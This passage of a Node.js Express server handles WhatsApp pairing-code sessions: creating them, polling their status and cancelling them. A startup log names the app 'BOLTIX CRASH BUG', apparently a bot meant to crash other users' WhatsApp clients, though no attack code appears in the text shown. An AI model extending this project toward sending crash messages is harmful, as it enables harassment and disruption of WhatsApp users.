    error: null,
    createdAt: now,
    updatedAt: now,
    finishedAt: null,
    expiresAt: now + IDLE_TTL_MS
  };
  pairings.set(id, pairing);
  activeByNumber.set(number, id);
  prune();
  console.log(`[pair] 🟡 session ${id} created`);

  try {
    const firstCode = await withTimeout(
      pairingStart(number, id),
      FIRST_CODE_TIMEOUT_MS,
      'Pairing code request timed out. Please try again.'
    );

    if (isTerminal(pairing)) {
      return res.status(409).json({ ok: false, error: pairing.error || 'Pairing request was cancelled.' });
    }

    const code = String(firstCode || '').trim().toUpperCase();
    if (!code) throw new Error('WhatsApp did not return a pairing code.');

    // Registry was already updated by receivePairingCode; idempotent here.
    applyCode(pairing, code);
    if (pairing.status === 'requesting' || pairing.status === 'restarting') {
      pairing.status = 'code_ready';
    }
    touch(pairing);

    return res.json(publicView(pairing));
  } catch (error) {
    console.error('[pair] ❌ error:', error?.message);
    if (!isTerminal(pairing)) finish(pairing, 'failed', error?.message || 'Pairing failed.');
    cleanupPairingSocket(id);
    return res.status(500).json({ ok: false, error: pairing.error });
  }
});

// Poll session status (polling itself keeps the session alive).
app.get('/api/pair/status', (req, res) => {
  const id = String(req.query.id || '');
  const pairing = pairings.get(id);
  if (!id || !pairing) {
    return res.status(404).json({ ok: false, error: 'Pairing session not found or expired.' });
  }
  if (!isTerminal(pairing)) {
    pairing.expiresAt = Math.min(Date.now() + IDLE_TTL_MS, pairing.createdAt + HARD_TTL_MS);
  }
  res.set('Cache-Control', 'no-store');
  return res.json(publicView(pairing));
});

// Cancel a session.
app.get('/api/pair/cancel', async (req, res) => {
  const id = String(req.query.id || '');
  const pairing = pairings.get(id);
  if (!pairing) return res.status(404).json({ ok: false, error: 'Pairing session not found.' });
  if (!isTerminal(pairing)) {
    finish(pairing, 'cancelled', 'Pairing cancelled.');
    cleanupPairingSocket(id);
  }
  return res.json(publicView(pairing));
});

app.listen(PORT, () => {
  console.log('[web] BOLTIX CRASH BUG listening on port', PORT);

  const html = findIndexHtml();
  if (html) console.log('[web] dashboard served from:', html);
  else console.warn('[web] ⚠ index.html NOT found in repo root or public/');

  start();
});
